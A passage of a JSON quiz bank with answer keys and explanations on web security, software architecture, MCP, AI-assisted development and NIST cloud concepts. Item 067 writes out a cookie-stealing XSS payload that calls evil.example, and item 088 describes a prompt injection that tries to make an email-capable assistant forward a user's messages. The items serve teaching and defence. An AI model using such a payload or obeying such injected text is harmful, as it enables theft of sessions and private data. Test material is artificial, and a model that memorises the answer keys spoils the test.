+  "exp": "An HSTS policy is trust-on-first-use: the browser only learns it after one successful HTTPS response, so the very first plaintext request remains strippable - the preload list closes that gap by shipping the policy inside the browser before any visit. Option B is correct practice and is in fact the prerequisite for preloading, but on its own it cannot protect a first-time visitor.",
+  "id": "GEN-T2U2-065"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L08",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A report screen lets the user pick which column to sort by. The developer tries to bind that column name as a query placeholder, but the driver quotes it as a string literal and the ordering stops working. What is the correct way to make the feature both work and be injection-safe?",
+  "opts": {
+   "A": "Escape the value with the driver's string-escaping function before concatenating it into the ORDER BY clause",
+   "B": "Concatenate the value but reject any input containing a semicolon, a quote or the word UNION",
+   "C": "Compare the value against a fixed server-side allow-list of permitted column names and interpolate only the matching literal from that list",
+   "D": "Wrap the value in single quotes inside the ORDER BY clause so the database treats it as a string"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Placeholders bind values, not identifiers, so a table name, column name or sort direction can never be parameterised; the only safe substitute is to map user input onto a fixed set of identifiers the code already knows and emit one of those. Escaping (option A) is designed for string literals and does not make an identifier position safe, and denylisting keywords (option B) is defeated by inputs the list did not anticipate.",
+  "id": "GEN-T2U2-066"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L08",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A page is served with the header Content-Security-Policy: script-src 'self'. An attacker succeeds in reflecting the markup <img src=x onerror=\"fetch('https://evil.example/'+document.cookie)\"> into that page. What happens when the image fails to load?",
+  "opts": {
+   "A": "The handler runs, because script-src governs <script> elements only and not event handler attributes",
+   "B": "The handler runs, because the injected markup is delivered from the page's own origin, which 'self' permits",
+   "C": "The handler is blocked only if the response additionally sends X-XSS-Protection: 1; mode=block",
+   "D": "The handler is blocked, because an inline event handler attribute counts as inline script and 'self' does not permit inline script"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "CSP treats inline event handler attributes as inline script, so a script-src list that omits 'unsafe-inline' (and supplies no matching nonce or hash) refuses to execute them - which is the main reason a nonce-based policy without 'unsafe-inline' blunts reflected XSS. Option B confuses the origin that served the HTML with the origin of the script source: 'self' only whitelists externally loaded scripts from the same origin, never inline code.",
+  "id": "GEN-T2U2-067"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L08",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "An application has an unfixed XSS flaw. Its session cookie is set Secure; HttpOnly; SameSite=Strict. What is the accurate assessment of the attacker's position?",
+  "opts": {
+   "A": "The injected script cannot read the cookie value, but it runs inside the application's own origin and can still drive authenticated state-changing requests to which the browser attaches the cookie",
+   "B": "SameSite=Strict causes the browser to refuse the injected script's requests to the application, because they originate from attacker-supplied markup",
+   "C": "HttpOnly prevents the injected script from executing in the first place",
+   "D": "Secure means the cookie is stored encrypted in the browser's cookie jar, so it cannot be exfiltrated even by script"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "HttpOnly hides the cookie from document.cookie, but the injected script executes with the page's origin and privileges, so it can perform the actions the session authorises without ever seeing the token - which is why cookie flags mitigate but never substitute for fixing XSS. Option B misreads SameSite: it is evaluated against the site of the request's initiating document, and here that document is the application itself, so the requests are same-site.",
+  "id": "GEN-T2U2-068"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L08",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A newly deployed HTTPS site loads without warnings in every desktop browser, but a curl call from a server fails with 'SSL certificate problem: unable to get local issuer certificate'. What is the most likely cause?",
+  "opts": {
+   "A": "The leaf certificate has expired, and browsers ignore expiry for certificates from well-known CAs",
+   "B": "The server presents the leaf certificate but omits the intermediate CA certificate; browsers complete the chain from cached intermediates or by fetching the issuer, while curl's trust store holds only roots",
+   "C": "The certificate's subject alternative names do not include the hostname being requested",
+   "D": "curl does not send SNI, so the server answers with the default virtual host's certificate"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "That specific error means chain building stopped short of a trusted root, and the usual cause is a server bundle missing the intermediate - browsers paper over it because they cache intermediates seen elsewhere and can fetch the issuer named in the certificate, which command-line clients generally do not do. A hostname mismatch (option C) would produce a distinct 'subject name does not match' error and would fail in the browser too.",
+  "id": "GEN-T2U2-069"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L08",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A stateless JSON API cannot keep a per-session CSRF token server-side, so it instead requires every state-changing request to carry a custom header such as X-CSRF-Token. Why does merely requiring that header defeat classic CSRF?",
+  "opts": {
+   "A": "Because an attacker's page has no way to discover which header name the application expects",
+   "B": "Because browsers refuse to attach cookies to any request that carries a custom header",
+   "C": "Because a custom header makes the request non-simple, so the browser must first send a CORS preflight, and without a permissive CORS response the state-changing request is never delivered",
+   "D": "Because HTML forms cannot set request headers, and forms are the only cross-site request vector available to an attacker"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Only a short safelist of headers may appear on a cross-origin request without a preflight; adding any other header forces an OPTIONS preflight that the application simply declines, so the real request never reaches the endpoint. Option D gets the form half right but is wrong overall - script-driven fetch and XHR are also cross-site vectors, and it is CORS, not the absence of those vectors, that stops them.",
+  "id": "GEN-T2U2-070"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L09",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A `Rectangle` class exposes `setWidth()` and `setHeight()`. A `Square` subclass overrides both so that setting one dimension silently sets the other. Reporting code that has always worked against a `Rectangle` reference — set width 5, set height 4, expect area 20 — starts producing 16 once a `Square` instance is passed in. Which SOLID principle has been violated?",
+  "opts": {
+   "A": "Single Responsibility Principle",
+   "B": "Interface Segregation Principle",
+   "C": "Liskov Substitution Principle",
+   "D": "Open/Closed Principle"
+  },
+  "ans": "C",
+  "exp": "Liskov substitution requires that an instance of a subtype can replace the supertype without breaking any guarantee the caller was entitled to rely on, and `Square` breaks the independent-dimensions contract that `Rectangle` advertises. The Open/Closed Principle is the tempting alternative but it concerns whether new behaviour can be added without editing existing code, and nothing here was extended by modification — the inheritance itself is what is unsound.",
+  "conf": "high",
+  "id": "GEN-T2U2-071"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L09",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A team argues that because every collaborator is supplied through a dependency-injection container rather than constructed with `new`, the codebase satisfies the Dependency Inversion Principle. What does DIP additionally require that a DI container by itself does not give you?",
+  "opts": {
+   "A": "That object graphs be wired by a framework rather than by hand-written factory code",
+   "B": "That the high-level policy and the low-level implementation both depend on an abstraction defined in terms of the high-level module's needs, rather than the policy depending on the concrete implementation",
+   "C": "That every concrete class in the system be paired with an interface, even where only one implementation exists",
+   "D": "That dependencies be resolved at runtime from configuration rather than being fixed at compile time"
+  },
+  "ans": "B",
+  "exp": "DIP is a statement about the direction of source-level dependencies — the policy layer owns the abstraction and the detail layer conforms to it — so a container that injects a concrete database class into a service still inverts nothing. Runtime resolution from configuration is a real capability of DI containers and sounds authoritative, but late binding is a mechanism, not the ownership rule DIP is about.",
+  "conf": "high",
+  "id": "GEN-T2U2-072"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L09",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "An order-placement flow spans an Order service, a Payment service and an Inventory service, each owning its own database. The architect rules out holding one ACID transaction open across all three. Which approach keeps the business outcome consistent instead?",
+  "opts": {
+   "A": "Two-phase commit driven by a coordinator in the API gateway",
+   "B": "Optimistic locking with a version column on the order row, retried on conflict",
+   "C": "Giving the three services a shared schema so a single database transaction can span them",
+   "D": "A saga: a sequence of local transactions in which each service commits its own step and publishes an event, with compensating transactions undoing earlier steps if a later one fails"
+  },
+  "ans": "D",
+  "exp": "A saga trades atomicity for eventual consistency, replacing rollback with explicit compensating actions such as refunding a payment or releasing a stock reservation, which is exactly the pattern for cross-service consistency without a distributed lock. Two-phase commit is the most tempting option because it does deliver atomicity, but it is precisely the distributed transaction that was ruled out — the coordinator becomes a blocking single point of failure holding locks across all three databases.",
+  "conf": "high",
+  "id": "GEN-T2U2-073"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L09",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A recommendation service begins responding in about 30 seconds instead of 50 milliseconds. The checkout service, which calls it synchronously on the product page, exhausts its request-handling thread pool waiting, and within minutes checkout stops serving even requests that never touch recommendations. Which pattern is specifically intended to stop this propagation?",
+  "opts": {
+   "A": "A circuit breaker that opens after a failure or latency threshold and fails fast on the recommendation call until the dependency is probed healthy again",
+   "B": "Retrying each recommendation call with exponential backoff and jitter",
+   "C": "Horizontally scaling the checkout service to more replicas",
+   "D": "Raising the HTTP client timeout on the recommendation call so slow responses still succeed"
+  },
+  "ans": "A",
+  "exp": "The failure is resource exhaustion caused by threads parked on a slow dependency, so the fix is to stop calling it: an open circuit breaker returns immediately with a fallback, freeing capacity for unrelated work, and a bulkhead limiting that dependency to its own bounded pool serves the same containment goal. Retry with backoff is a genuinely good practice for transient errors, which makes it tempting, but against an overloaded dependency it multiplies in-flight calls and accelerates the collapse; raising the timeout holds threads even longer.",
+  "conf": "high",
+  "id": "GEN-T2U2-074"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L09",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A service publishes `AccountDebited` and `AccountCredited` events to an Apache Kafka topic with six partitions, consumed by a consumer group. Events concerning the same account must be processed in the order they were produced, while events for different accounts may be processed in parallel. Which measure achieves this?",
+  "opts": {
+   "A": "Configuring the consumer group with exactly as many consumer instances as there are partitions",
+   "B": "Producing every event with the account identifier as the message key, so that all events for one account are routed to the same partition",
+   "C": "Setting `auto.offset.reset` to `earliest` on the consumer group",
+   "D": "Increasing the topic's partition count so each account is statistically likely to get its own partition"
+  },
+  "ans": "B",
+  "exp": "Kafka guarantees ordering only within a single partition, and the default partitioner hashes the message key, so keying by account identifier pins one account's whole event stream to one partition read by one consumer in the group. Adding partitions is the opposite of a fix — it spreads an unkeyed account's events across more partitions and destroys any ordering, and no partition count makes the routing deterministic without a key.",
+  "conf": "high",
+  "id": "GEN-T2U2-075"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L09",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A worker consuming an Amazon SQS standard queue throws an unhandled exception on one malformed message. The message's visibility timeout expires, it returns to the queue, the worker picks it up and crashes again, and this repeats indefinitely while healthy messages pile up behind it. Which queue configuration is the standard remedy for this poison-message loop?",
+  "opts": {
+   "A": "Lengthening the visibility timeout so the message stays invisible longer between attempts",
+   "B": "Converting the queue to FIFO so the message is delivered exactly once",
+   "C": "A redrive policy that moves the message to a dead-letter queue once its receive count exceeds `maxReceiveCount`",
+   "D": "Adding more worker instances so the malformed message occupies a smaller share of consumer capacity"
+  },
+  "ans": "C",
+  "exp": "A redrive policy counts deliveries per message and diverts anything exceeding `maxReceiveCount` to a dead-letter queue, quarantining the bad message for offline inspection while the main queue drains. FIFO queues are the most plausible distractor because they do offer exactly-once processing within the deduplication window, but that governs duplicate sends, not repeated redelivery after a consumer failure — a FIFO queue would in fact make things worse by blocking the whole message group behind the poison message.",
+  "conf": "high",
+  "id": "GEN-T2U2-076"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L09",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A write-heavy service places a cache in front of its database. The design requires the lowest achievable write latency and explicitly accepts that a crash of a cache node may lose the most recent writes that have not yet been flushed to the database. Which cache write strategy is being described?",
+  "opts": {
+   "A": "Write-behind (write-back), where the write is acknowledged from the cache and persisted to the database asynchronously in batches",
+   "B": "Write-through, where every write goes to the cache and the database as one synchronous operation",
+   "C": "Cache-aside, where the application writes to the database and invalidates the cached entry",
+   "D": "Refresh-ahead, where the cache proactively reloads entries that are about to expire"
+  },
+  "ans": "A",
+  "exp": "Write-behind acknowledges the client as soon as the cache accepts the write and drains to the database later, which is what buys the low latency and what creates the durability window the requirement concedes. Write-through is the natural competitor and shares the same access shape, but because it commits to the database before acknowledging it has strictly higher write latency and loses nothing on a cache failure.",
+  "conf": "high",
+  "id": "GEN-T2U2-077"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L09",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A frontend codebase is described as MVVM rather than MVC. Which statement identifies the defining structural difference?",
+  "opts": {
+   "A": "MVVM eliminates the model layer, so the view obtains data by calling the backend API directly",
+   "B": "In MVVM the view model produces the rendered markup while the view holds the application state",
+   "C": "MVVM applies only to server-rendered pages, whereas MVC applies only to client-side applications",
+   "D": "In MVVM the view binds declaratively to observable state exposed by a view model that holds no reference to the view, so state changes propagate through the binding rather than through a controller that handles each interaction"
+  },
+  "ans": "D",
+  "exp": "MVVM's distinguishing mechanism is data binding: the view model publishes observable state and commands and is deliberately ignorant of any view, which is what makes it unit-testable without a rendering surface. The claim that MVVM drops the model is the most seductive wrong answer because view models are often mistaken for models, but MVVM keeps a domain/model layer and adds the view model as a presentation-shaped adapter over it.",
+  "conf": "high",
+  "id": "GEN-T2U2-078"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L09",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A Node.js project's `package.json` declares a dependency as `\"lodash\": \"^4.17.20\"` and the lockfile has been deleted. Under npm's semantic-versioning range rules, which of these published versions may `npm install` resolve the dependency to?",
+  "opts": {
+   "A": "3.10.1",
+   "B": "4.19.3",
+   "C": "5.0.1",
+   "D": "4.17.19"
+  },
+  "ans": "B",
+  "exp": "The caret range `^4.17.20` admits any version at or above 4.17.20 but below the next major, i.e. `>=4.17.20 <5.0.0`, so 4.19.3 is in range and npm will take the highest published match. 4.17.19 is the trap: it looks close enough to satisfy the caret, but it is lower than the stated minimum, and 5.0.1 crosses the major boundary the caret exists to hold.",
+  "conf": "high",
+  "id": "GEN-T2U2-079"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L10",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "An Nginx reverse proxy fronts a Node backend that streams a generative AI completion to the browser as Server-Sent Events. Run locally the tokens appear one by one; through Nginx the client receives nothing until the model has finished, and then the whole response arrives at once. The location block is:\n\nlocation /api/chat/ {\n    proxy_pass http://127.0.0.1:8080;\n    proxy_http_version 1.1;\n    proxy_set_header Connection \"\";\n}\n\nWhich addition fixes the delivery?",
+  "opts": {
+   "A": "proxy_read_timeout 3600s;",
+   "B": "proxy_set_header Upgrade $http_upgrade;",
+   "C": "proxy_buffering off;",
+   "D": "proxy_cache_bypass $http_pragma;"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Nginx buffers the upstream response by default, so an SSE stream is withheld until a buffer fills or the upstream closes the connection; turning buffering off for that location (or having the upstream send X-Accel-Buffering: no) passes each chunk straight through. The Upgrade header pair matters for the WebSocket handshake, not for SSE, which is an ordinary long-lived HTTP response.",
+  "id": "GEN-T2U2-080"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L10",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "An MCP server for a deployment platform has to expose two capabilities: the text of a service's log file, which the host application should be able to fetch and place into the model's context on demand, and an operation that restarts that service. Which MCP primitives fit these two respectively?",
+  "opts": {
+   "A": "Both as tools, since either way the host has to make a call to the server",
+   "B": "The log file as a resource and the restart as a tool",
+   "C": "The log file as a prompt and the restart as a resource",
+   "D": "Both as resources, with the restart modelled as a writable resource"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "MCP resources are addressable, readable context that a client retrieves and hands to the model, whereas tools are invocable functions with side effects that the model can choose to call — a log file is context, a restart is an action. Option A is tempting because both involve a round trip to the server, but it discards precisely the distinction MCP draws so that a host can apply different trust and approval rules to reading data versus performing actions; prompts, the third primitive, are reusable templated interactions, not file contents.",
+  "id": "GEN-T2U2-081"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L10",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "Messages exchanged between a host application's MCP client and an MCP server are encoded using which pre-existing specification?",
+  "opts": {
+   "A": "JSON-RPC 2.0",
+   "B": "gRPC with Protocol Buffers",
+   "C": "GraphQL queries over HTTP POST",
+   "D": "SOAP 1.2 envelopes over HTTP"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "MCP defines its requests, responses and notifications as JSON-RPC 2.0 messages, which is what lets the identical message shapes travel over a local stdio pipe or an HTTP-based transport without change. gRPC is the natural guess because it is the usual choice for machine-to-machine RPC, but it requires a binary codec and HTTP/2 and so would not suit the plain stdio local-subprocess server that MCP is built to support.",
+  "id": "GEN-T2U2-082"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L10",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "Reviewing code produced by an AI coding assistant, a developer finds an import of an npm package whose name resembles, but is not, a well-known library. npm install succeeds and CI is green. Why is this a supply-chain concern rather than merely a typo?",
+  "opts": {
+   "A": "The invented name will break semantic-version resolution the next time the lockfile is refreshed",
+   "B": "npm silently substitutes the nearest published package name, so runtime behaviour differs from the source",
+   "C": "No type declarations will be found, so TypeScript degrades the import to any and hides errors",
+   "D": "Models invent the same plausible package names repeatedly, and attackers pre-register those names, so a successful install pulls attacker-controlled code"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Hallucinated dependency names cluster rather than being random, so an attacker who publishes them obtains code execution in every build and developer machine that installs one — which is why the install succeeding is the alarming outcome, not a failing one. npm performs no nearest-name substitution: an unpublished name simply 404s, so the fact that it resolved at all is the evidence that somebody registered it.",
+  "id": "GEN-T2U2-083"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L10",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A support chat widget calls a stateless hosted generative AI chat-completion API, so the backend resends the whole transcript on every turn. Ignoring prompt caching, and assuming the transcript still fits inside the context window, how do the cumulative billed input tokens for one session grow with the number of turns n?",
+  "opts": {
+   "A": "Roughly linearly in n, because exactly one request is issued per turn",
+   "B": "Roughly with n squared, because each turn resends everything that preceded it",
+   "C": "Constant after the first turn, because the provider deduplicates context it has already seen in the session",
+   "D": "Bounded by the model's context window, so the session's cost stops rising once that size is reached"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Turn k carries about k turns' worth of transcript, and summing k from 1 to n produces an n-squared term, so a long conversation costs far more than n times the opening request. Option D confuses a per-request limit with a per-session total: the context window caps how much any single call may carry, but every later call still bills that retained context again.",
+  "id": "GEN-T2U2-084"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L10",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A first-party web analytics script must post a small end-of-session payload as the user navigates away, but requests started from a visibilitychange or unload handler are frequently cancelled when the document is torn down. Which browser API was introduced specifically to hand such a request to the user agent for delivery after the page is gone?",
+  "opts": {
+   "A": "navigator.sendBeacon()",
+   "B": "window.requestIdleCallback()",
+   "C": "A synchronous XMLHttpRequest issued inside the unload handler",
+   "D": "A beforeunload listener that returns a string"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "sendBeacon() queues a small POST with the user agent, which undertakes to send it even after the document unloads, and it returns immediately so navigation is never delayed. Synchronous XHR in unload was the old workaround that sendBeacon exists to replace — browsers now block or ignore it precisely because it stalls the next navigation.",
+  "id": "GEN-T2U2-085"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L10",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A Kubernetes Deployment proxies user requests to an external generative AI provider; each request occupies a pod for 20-40 seconds while awaiting the upstream. Under load, queueing latency climbs steeply, but the HorizontalPodAutoscaler targeting 70% CPU utilisation reports the pods at about 5% CPU and never scales out. What explains this, and what is the correct fix?",
+  "opts": {
+   "A": "The CPU target is set too high; lowering it to 30% will make the same signal trigger scale-out",
+   "B": "The pods declare no CPU requests, so the HPA cannot compute utilisation; adding requests restores scaling",
+   "C": "The pods are blocked on I/O so CPU stays low; autoscale instead on a metric reflecting concurrency, such as in-flight requests or queue depth",
+   "D": "The readiness probe marks pods unready during long requests, so the HPA excludes them when averaging the metric"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "The workload is I/O-bound on the upstream API, so CPU is a poor proxy for saturation — the resource actually exhausted is concurrent in-flight requests per pod, which is what the autoscaler must observe via a custom or external metric. Lowering the target, as option A proposes, changes nothing when measured utilisation is 5%: the threshold is not the problem, the choice of signal is; and the reported 5% figure shows utilisation is being computed, so option B's missing-requests scenario is not what is happening.",
+  "id": "GEN-T2U2-086"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L10",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A state government department discovers that its public web portal has been defaced and a table of registered users exfiltrated. Under the CERT-In directions issued in April 2022, within what period of noticing such an incident must it be reported to CERT-In?",
+  "opts": {
+   "A": "72 hours",
+   "B": "24 hours",
+   "C": "30 days",
+   "D": "6 hours"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "The 2022 directions require the specified categories of cyber incident to be reported to CERT-In within six hours of noticing them or being brought to notice, a far tighter window than practitioners expect. Option A is the trap because 72 hours is the GDPR breach-notification deadline, which is frequently and wrongly assumed to apply in India; the same CERT-In directions also require ICT system logs to be maintained for 180 days within Indian jurisdiction.",
+  "id": "GEN-T2U2-087"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L10",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A web assistant fetches third-party pages and summarises them, and is also connected to an MCP server that can send email on the user's behalf. One retrieved page contains text instructing the assistant to forward the user's recent messages to an outside address. Which mitigation actually addresses this class of attack?",
+  "opts": {
+   "A": "Adding a line to the system prompt telling the model to disregard any instructions found inside retrieved content",
+   "B": "Enforcing authorisation and explicit user confirmation at the tool layer, so a send action cannot occur on the model's decision alone",
+   "C": "HTML-escaping the retrieved page before inserting its text into the prompt",
+   "D": "Lowering the sampling temperature so the model's output becomes more deterministic"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Untrusted retrieved text and trusted instructions reach the model as one undifferentiated token stream, so no wording inside the prompt reliably separates them; the durable control sits outside the model, in least-privilege tool scopes and a confirmation step before any side-effecting call. Option A is the usual first attempt and is defeated by rephrased injections, because it asks the model to police the very boundary it cannot perceive; escaping HTML does nothing, since the payload is ordinary prose, not markup.",
+  "id": "GEN-T2U2-088"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L01",
+  "sub": "Distributed, edge and cloud computing; NIST cloud architecture",
+  "q": "A cloud provider's console shows a customer, in near real time, the GB-hours of storage and vCPU-seconds each project has consumed, and bills strictly on those counters. Which of the five essential characteristics in the NIST definition of cloud computing does this most directly illustrate?",
+  "opts": {
+   "A": "Rapid elasticity",
+   "B": "Measured service",
+   "C": "Resource pooling",
+   "D": "On-demand self-service"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Measured service is NIST's term for metering resource use at a level of abstraction appropriate to the service, with usage monitored, controlled and reported transparently to both provider and consumer. Rapid elasticity is about capacity following demand, not about the meter that records it.",
+  "id": "GEN-T2U4-001"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L01",
+  "sub": "Distributed, edge and cloud computing; NIST cloud architecture",
+  "q": "A firm sits between a government department and three cloud providers: it combines their services into one composite offering, adds single sign-on and a consolidated bill, and negotiates terms on the department's behalf. In the NIST cloud computing reference architecture, which actor is this firm?",
+  "opts": {
+   "A": "Cloud auditor",
+   "B": "Cloud carrier",
+   "C": "Cloud broker",
+   "D": "Cloud provider"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "The cloud broker manages the use, performance and delivery of cloud services and negotiates relationships between providers and consumers, with service intermediation, aggregation and arbitrage as its named functions. The cloud auditor only conducts independent assessment of services, operations, performance and security, and never resells or aggregates them.",
+  "id": "GEN-T2U4-002"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L01",
+  "sub": "Distributed, edge and cloud computing; NIST cloud architecture",
+  "q": "A globally replicated profile store keeps accepting reads and writes on both sides of a network partition and merges the diverged versions after the partition heals. Users occasionally read a value older than one they just wrote. In CAP terms, what does this describe?",
+  "opts": {
+   "A": "Availability and partition tolerance are chosen, so a read is not guaranteed to reflect the most recent acknowledged write",
+   "B": "Consistency and partition tolerance are chosen, so the stale reads must be a client-side caching defect rather than a consequence of the design",
+   "C": "Consistency and availability are chosen, and because the replicas sit inside one provider's network a partition cannot arise",
+   "D": "All three properties are achieved, because eventual consistency is strong consistency with a bounded delay"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "A partition forces a choice, and staying writable on both sides is the AP choice: until the replicas converge, a read may legitimately miss the newest acknowledged write. Option D is the standard misreading — eventual consistency promises convergence eventually, with no bound and no guarantee that any particular read is current.",
+  "id": "GEN-T2U4-003"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L01",
+  "sub": "Distributed, edge and cloud computing; NIST cloud architecture",
+  "q": "A plant streams video from 200 cameras to a cloud region for defect detection. Alerts are needed within 30 seconds, a deadline the existing cloud round trip already meets comfortably. The team moves the detection model onto an on-site edge server that uploads only short clips of detected defects. What does this change primarily achieve?",
+  "opts": {
+   "A": "It removes the plant's need for wide-area connectivity, since all processing is now local",
+   "B": "It eliminates round-trip latency that would otherwise cause the 30-second deadline to be missed",
+   "C": "It makes each camera's detection results strongly consistent with the central database",
+   "D": "It cuts the sustained upstream bandwidth the site must carry, because only event clips rather than continuous streams cross the wide-area link"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Filtering at the edge changes what crosses the wide-area link from 200 continuous streams to occasional clips, which is a bandwidth and transport-cost reduction rather than a latency one. Option B is ruled out by the stem, which states the cloud round trip already meets the 30-second deadline; option A is wrong because the site still uploads clips and must be managed remotely.",
+  "id": "GEN-T2U4-004"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L01",
+  "sub": "Distributed, edge and cloud computing; NIST cloud architecture",
+  "q": "A replicated key-value store keeps N = 5 replicas. A write is acknowledged once W = 3 replicas confirm it, and a read consults R = 2 replicas. Under the usual quorum rule, is every read guaranteed to observe the most recently acknowledged write?",
+  "opts": {
+   "A": "Yes — W = 3 is a majority of the replicas, and a majority write by itself guarantees any later read observes it",
+   "B": "No — R + W is not greater than N, so a read set can consist entirely of the two replicas that did not take the write",
+   "C": "Yes — the overlap condition is R + W ≥ N, and 2 + 3 satisfies it",
+   "D": "No — read sets and write sets can overlap only when R = N, so any smaller R makes stale reads certain"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Quorum overlap requires R + W > N; here 2 + 3 = 5 exactly equals N, so the two replicas a reader consults can be precisely the two that missed the write. Option C is the off-by-one that makes this configuration look safe, stating the condition as ≥ instead of >.",
+  "id": "GEN-T2U4-005"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L01",
+  "sub": "Distributed, edge and cloud computing; NIST cloud architecture",
+  "q": "Under the NIST definition of cloud computing, which statement about the private cloud deployment model is correct?",
+  "opts": {
+   "A": "The infrastructure must be located on the consuming organisation's own premises",
+   "B": "The infrastructure must be owned and operated by the consuming organisation's own staff",
+   "C": "The infrastructure is provisioned for exclusive use by a single organisation, but it may be owned, managed and operated by a third party and may exist off premises",
+   "D": "It differs from a community cloud only in the number of virtual machines provisioned; both serve a single organisation"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "NIST defines a private cloud by exclusivity of use — a single organisation comprising multiple consumers — and expressly allows it to be owned, managed and operated by that organisation, a third party, or a combination, on or off premises. The on-premises assumption in option A is the most common misreading: physical location is not part of the definition at all.",
+  "id": "GEN-T2U4-006"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L01",
+  "sub": "Distributed, edge and cloud computing; NIST cloud architecture",
+  "q": "A service invokes a peer over the network and the call times out. Compared with a function call failing inside a single process, what is the fundamental new difficulty this introduces?",
+  "opts": {
+   "A": "The caller cannot tell whether the peer never received the request, is merely slow, or executed it and lost the reply, so the outcome of the operation is unknown",
+   "B": "The failure is handled entirely by the transport layer, so the application code needs no new logic",
+   "C": "The peer's failure necessarily leaves the whole system unavailable, unlike a local exception which is contained",
+   "D": "A timeout in a distributed system always means the peer crashed, so the caller can safely assume the request did not run"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "A timeout carries no information about whether the remote side executed the request, which is why distributed designs need idempotency keys, retries and reconciliation rather than plain exception handling. Option D states the opposite and is the assumption that produces duplicate side effects: a timed-out request may well have committed on the peer.",
+  "id": "GEN-T2U4-007"
+ },
+ {
+  "unit": "4",
+  "slug": "U4-L01",
+  "sub": "Distributed, edge and cloud computing; NIST cloud architecture",
+  "q": "A datacentre team calls its on-premises cluster 'scalable' because more nodes can be racked once a capacity request is approved. Judged against NIST's essential characteristic of rapid elasticity, what is still missing?",
+  "opts": {
+   "A": "Provisioning must be fully automatic, since the definition requires automation in every case",
+   "B": "The provider must actually hold unlimited physical capacity behind the service",
+   "C": "Capacity must be added by moving to larger machines rather than by adding more of them",
